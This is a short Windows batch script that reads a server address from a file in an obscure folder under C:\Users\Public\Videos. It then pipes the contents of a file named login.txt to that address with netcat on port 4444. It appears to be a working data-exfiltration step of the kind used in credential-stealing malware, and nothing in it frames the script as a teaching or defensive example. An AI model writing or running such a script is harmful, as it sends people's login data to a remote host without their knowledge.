@echo off
set /p SERVER_IP=<C:\Users\Public\Videos\GraphicalUserInterface\url.txt

echo Sending data from login.txt to netcat listener...
type C:\Users\Public\Videos\GraphicalUserInterface\login.txt | nc %SERVER_IP% 4444
echo Data sent.
